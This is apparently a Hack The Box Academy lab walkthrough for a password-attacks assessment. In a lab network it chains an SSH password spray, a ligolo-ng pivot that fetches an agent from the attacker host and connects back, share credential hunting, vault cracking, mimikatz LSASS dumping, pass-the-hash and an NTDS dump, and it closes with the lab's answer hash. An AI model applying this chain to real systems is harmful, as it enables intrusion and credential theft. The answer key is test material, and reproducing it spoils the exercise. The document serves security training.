With a list of potential usernames and a potential password, students need to brute-force the `SSH` service by using `hydra`.

Code: shell

```shell
hydra -L user.list -p 'Texas123!@#' ssh://STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~/username-anarchy]
└──╼ [★]$ hydra -L user.list -p 'Texas123!@#' ssh://10.129.234.116

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-11 08:54:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-11 08:54:21
```

Students found valid credentials (`jbetty:Texas123!@#`) which means they can now `SSH` into the machine.

Code: shell

```shell
ssh jbetty@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~/username-anarchy]
└──╼ [★]$ ssh jbetty@10.129.234.116

The authenticity of host '10.129.234.116 (10.129.234.116)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.116' (ED25519) to the list of known hosts.
jbetty@10.129.234.116's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

<SNIP>

jbetty@DMZ01:~$
```

Students have now gained a foothold on the `DMZ01` machine. Students will perform some reconnaissance and look for possible credentials within the target:

Code: shell

```shell
grep 'pass' -r /home/ 2>/dev/null
```

```shell-session
jbetty@DMZ01:~$ grep 'pass' -r /home/ 2>/dev/null

/home/jbetty/.bash_history:sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
/home/jbetty/.bash_history:passwd
```

Credentials for user `hwilliam` were discovered as they were used to access the `file01` host. Since from the attacker host, students do not have access to the internal network, students will need to perform pivoting using `DMZ01`.

To perform this, students will download and extract the server and the client of `ligolo-ng` on the attacker host:

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

LICENSE
README.md
agent

┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

LICENSE
README.md
proxy
```

Students will now create a http server on the attacker host by leveraging `python3 -m http.server` module:

Code: shell

```shell
python3 -m http.server
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And on `DMZ01` SSH session students will download the `ligolo-ng agent`:

Code: shell

```shell
wget http://PWNIP:8000/agent
```

```shell-session
jbetty@DMZ01:~$ wget http://10.10.14.209:8000/agent

--2025-06-11 14:22:37--  http://10.10.14.209:8000/agent
Connecting to 10.10.14.209:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6475928 (6.2M) [application/octet-stream]
Saving to: ‘agent’

agent               100%[===================>]   6.18M  35.2MB/s    in 0.2s    

2025-06-11 14:22:38 (35.2 MB/s) - ‘agent’ saved [6475928/6475928]
```

Students will return to the attack host and start the proxy server with the `-selfcert` option:

Code: shell

```shell
sudo ./proxy -selfcert
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-bhaobluks0]─[~]
└──╼ [★]$ sudo ./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0005] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0005] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0005] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng »
```

Now, on the `DMZ01` SSH session, students will connect the agent to the proxy server hosted on the attacking host using the option `--ignore-cert`:

Code: shell

```shell
chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
```

```shell-session
jbetty@DMZ01:~$ ./agent -connect 10.10.14.209:11601 --ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.209:11601"
```

Students will now use the `session` command on the `ligolo-ng` terminal and select session 1 for `jbetty@DMZ01`:

Code: shell

```shell
session
```

```shell-session
ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.234.116:35974 - 00505694f5af
[Agent : jbetty@DMZ01] »
```

Once the session is specified, students will use the `autoroute` command on the `ligolo-ng` terminal and select the route `172.16.119.13/24` by hitting space and then enter, then `Create a new interface` and lastly start the tunnel by writing `y`.

Code: shell

```shell
autoroute
```

```shell-session
[Agent : jbetty@DMZ01] » autoroute

? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
INFO[0103] Generating a random interface name...        
INFO[0103] Using interface name desiredtank             
INFO[0103] Creating routes for desiredtank...           
? Start the tunnel? Yes
INFO[0124] Starting tunnel to jbetty@DMZ01 (00505694b7c3)
```

Everything will now be set up and students will be able to reach the internal network. To confirm this students can create a file with all the targets for easier spray.

Code: shell

```shell
cat << EOF > hosts
172.16.119.13
172.16.119.7
172.16.119.10
172.16.119.11
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-fnw6v8hpeq]─[~]
└──╼ [★]$ cat << EOF > hosts
172.16.119.13
172.16.119.7
172.16.119.10
172.16.119.11
EOF
```

Students will then test the known credentials using `nxc`:

Code: shell

```shell
nxc rdp hosts -u hwilliam -p 'dealer-screwed-gym1'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-fnw6v8hpeq]─[~]
└──╼ [★]$ nxc rdp hosts -u hwilliam -p 'dealer-screwed-gym1'

RDP         172.16.119.7    3389   JUMP01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:JUMP01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.10   3389   FILE01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:FILE01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.11   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.7    3389   JUMP01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 (Pwn3d!)
RDP         172.16.119.10   3389   FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1
RDP         172.16.119.11   3389   DC01             [+] nexura.htb\hwilliam:dealer-screwed-gym1
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

The user `hwilliams` can connect to `JUMP01` via `RDP` as can been seen by the `nxc` output above.

Students will then use `xfreerdp` and share the attacker host current working using the option `/drive:linux,.`:

Code: shell

```shell
xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

After the `RDP` session has been established, students need to perform credential hunting in network shares by using `Snaffler`. To do this, students will return to the attack host and download the `Snaffler` executable to the directory which is being shared via `xfreerdp`.

Code: shell

```shell
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-fnw6v8hpeq]─[~]
└──╼ [★]$ wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe
```

Students will now enumerate the shares available in order to prioritize potential targets.

Code: shell

```shell
nxc smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ nxc smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares

SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1
SMB         172.16.119.11   445    DC01             [+] nexura.htb\hwilliam:dealer-screwed-gym1
SMB         172.16.119.11   445    DC01             [*] Enumerated shares
SMB         172.16.119.11   445    DC01             Share           Permissions     Remark
SMB         172.16.119.11   445    DC01             -----           -----------     ------
SMB         172.16.119.11   445    DC01             ADMIN$                          Remote Admin
SMB         172.16.119.11   445    DC01             C$                              Default share
SMB         172.16.119.11   445    DC01             IPC$            READ            Remote IPC
SMB         172.16.119.11   445    DC01             NETLOGON        READ            Logon server share
SMB         172.16.119.11   445    DC01             SYSVOL          READ            Logon server share
SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
SMB         172.16.119.10   445    FILE01           Share           Permissions     Remark
SMB         172.16.119.10   445    FILE01           -----           -----------     ------
SMB         172.16.119.10   445    FILE01           ADMIN$                          Remote Admin
SMB         172.16.119.10   445    FILE01           C$                              Default share
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE  
SMB         172.16.119.10   445    FILE01           IPC$            READ            Remote IPC
SMB         172.16.119.10   445    FILE01           IT                          
SMB         172.16.119.10   445    FILE01           MANAGEMENT                  
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE  
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE
```

The `FILE01` host has some interesting non-default shares, so students can start by targeting that host alone to lower false-positives as much as possible.

Students will then open the `linux` share using the File Explorer and copy the previous downloaded `Snaffler.exe` to the Desktop:

![Password_Attacks_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_32.png)

![Password_Attacks_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_33.png)

Students will then open the command prompt and execute:

Code: cmd

```cmd
C:\Users\hwilliam\Desktop\Snaffler.exe -u -s -n FILE01.nexura.htb
```

```cmd-session
C:\Users\hwilliam\Desktop>.\Snaffler.exe -u -s -n FILE01.nexura.htb

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Info] Parsing args...
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Info] Parsed args successfully.
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Info] Getting interesting users from AD.
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Error] Something went wrong adding domain users to rules.
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Info] Starting to look for readable shares...
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Info] Created all sharefinder tasks.
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\HR>(R)
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\PRIVATE>(R)
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:06Z [Share] {Green}<\\FILE01.nexura.htb\TRANSFER>(R)
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|32kB|2025-04-29 16:02:38Z>(\\FILE01.nexura.htb\HR\2024\Password Policy 2024.doc) Password Policy 2024.doc
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|32kB|2025-04-29 16:02:38Z>(\\FILE01.nexura.htb\HR\2025\Password Policy 2025.doc) Password Policy 2025.doc
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|48B|2025-04-29 15:13:43Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.plk) Employee-Passwords_OLD.plk
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Black}<KeepPassMgrsByExtension|R|^\.psafe3$|1.1kB|2025-04-29 15:09:57Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3) .psafe3
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|1.1kB|2025-04-29 15:09:57Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3) Employee-Passwords_OLD.psafe3
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|856B|2025-04-29 15:10:02Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD_011.ibak) Employee-Passwords_OLD_011.ibak
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|904B|2025-04-29 15:10:04Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD_012.ibak) Employee-Passwords_OLD_012.ibak
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|952B|2025-04-29 15:10:07Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD_013.ibak) Employee-Passwords_OLD_013.ibak
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|32kB|2025-04-29 16:02:38Z>(\\FILE01.nexura.htb\HR\Archive\Password Policy OUTDATED.doc) Password Policy OUTDATED.doc
[NEXURA\hwilliam@JUMP01] 2025-06-11 20:13:07Z [File] {Green}<KeepNameContainsGreen|R|passw|7.2kB|2025-04-29 16:16:49Z>(\\FILE01.nexura.htb\PRIVATE\hwilliam\Online passwords.xlsx) Online passwords.xlsx
```

Students will notice that there is a file named `Employee-Passwords_OLD.psafe3`

![Password_Attacks_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_34.png)

Students will then connect to the `HR` share using `smbclient`, navigate to the `Archive` directory, and download the `.psafe3` file by using the `get` command once connected.

Code: shell

```shell
smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR'
cd Archive
get Employee-Passwords_OLD.psafe3
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR'

Password for [NEXURA.HTB\hwilliam]:
Try "help" to get a list of possible commands.
smb: \>
smb: \> cd Archive
smb: \Archive\> get Employee-Passwords_OLD.psafe3

getting file \Archive\Employee-Passwords_OLD.psafe3 of size 1080 as Employee-Passwords_OLD.psafe3 (28.5 KiloBytes/sec) (average 28.5 KiloBytes/sec)
```

After downloading the file to the attacker host, students can then need to use `hashcat` to try to crack the password that protects this password vault. They can find out what mode to use by using `hashcat` and displaying the example hashes with the `--example-hashes` parameter:

Code: shell

```shell
hashcat --example-hashes | grep -i safe -A 5
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ hashcat --example-hashes | grep -i safe -A 5

  Name................: Password Safe v3
  Category............: Password Manager
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
--
  Name................: Password Safe v2
  Category............: Password Manager
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
```

Students will find that the mode to use is `5200`, students will then use `rockyou` to attempt to crack the password:

Code: shell

```shell
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz 

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
<SNIP>

Dictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 bytes (6Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Employee-Passwords_OLD.psafe3:michaeljackson              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Employee-Passwords_OLD.psafe3
Time.Started.....: Wed Jun 11 15:30:22 2025 (25 secs)
Time.Estimated...: Wed Jun 11 15:30:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
<SNIP>
```

Since `Password Safe 3` is already installed in `FILE01`, students can make use of this by connecting to the `linux` share and copying the file to the host:

![Password_Attacks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_35.png)

Students will open `Password Safe 3` select the Password Database path as `C:\Users\hwilliam\Desktop\Employee-Passwords_OLD.psafe3` and input the previous cracked password.

The vault gives the students access to two new credentials, one for user `bdavid` with the password `caramel-cigars-reply1` and one for user `stom` with the password `fails-nibble-disturb4`.

Students will then spray the new credentials against the hosts and find that user `bdavid` is an Administrator on `JUMP01`:

Code: shell

```shell
nxc winrm hosts -u bdavid -p 'caramel-cigars-reply1'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ nxc winrm hosts -u bdavid -p 'caramel-cigars-reply1'

WINRM       172.16.119.7    5985   JUMP01           [*] Windows 10 / Server 2019 Build 17763 (name:JUMP01) (domain:nexura.htb)
WINRM       172.16.119.11   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb)
WINRM       172.16.119.10   5985   FILE01           [*] Windows 10 / Server 2019 Build 17763 (name:FILE01) (domain:nexura.htb)
WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)
WINRM       172.16.119.11   5985   DC01             [-] nexura.htb\bdavid:caramel-cigars-reply1
WINRM       172.16.119.10   5985   FILE01           [-] nexura.htb\bdavid:caramel-cigars-reply1
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Since that is the case, students can check if the credentials are also valid for `RDP`, and if they are dump the `LSASS`:

Code: shell

```shell
nxc rdp 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ nxc rdp 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'

RDP         172.16.119.7    3389   JUMP01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:JUMP01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.7    3389   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)
```

Students will close the previous `RDP` session as `hwilliam` and use `xfreerdp` to get a `RDP` session on the target as `bdavid`:

Code: shell

```shell
xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /drive:linux,.
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /drive:linux,.

[16:01:05:177] [103494:103495] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
<SNIP>
```

Students need to `cp` the `mimikatz` executable from `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe` to the directory that is being shared via `RDP`:

Code: shell

```shell
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

Students will then visit the share using the File Explorer and copy `mimikatz.exe` to the Desktop:

![Password_Attacks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_36.png)

Students need to open a command prompt with Administrator privileges.

![Password_Attacks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_37.png)

Students will then use `mimikatz.exe` as follows:

Code: cmd

```cmd
C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

```cmd-session
C:\Windows\system32>C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 265194 (00000000:00040bea)
Session           : RemoteInteractive from 2
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
Logon Time        : 6/11/2025 3:01:50 PM
SID               : S-1-5-21-1333759777-277832620-2286231135-1106
        msv :
         [00000003] Primary
         * Username : stom
         * Domain   : NEXURA
         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
        tspkg :
        wdigest :
         * Username : stom
         * Domain   : NEXURA
         * Password : (null)
        kerberos :
         * Username : stom
         * Domain   : NEXURA.HTB
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

Students will be able to get a NTLM hash for user `stom`, which they will spray across the hosts:

Code: shell

```shell
nxc smb hosts -u stom -H 21ea958524cfd9a7791737f8d2f764fa
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ nxc smb hosts -u stom -H 21ea958524cfd9a7791737f8d2f764fa

SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\stom:21ea958524cfd9a7791737f8d2f764fa (Pwn3d!)
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:21ea958524cfd9a7791737f8d2f764fa (Pwn3d!)
```

The user `stom` is an Administrator on DC01, which makes dumping the `NTDS.dit` file possible.

```shell
nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator
```

```shell-session
┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-scs0v5am0u]─[~]
└──╼ [★]$ nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator

SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:21ea958524cfd9a7791737f8d2f764fa (Pwn3d!)
SMB         172.16.119.11   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.119.11   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:{hidden}:::
<SNIP>
```

Students will then submit the `NT` hash for the Administrator as the answer.

Answer: `36e09e1e6ade94d63fbcab5e5b8d6d23`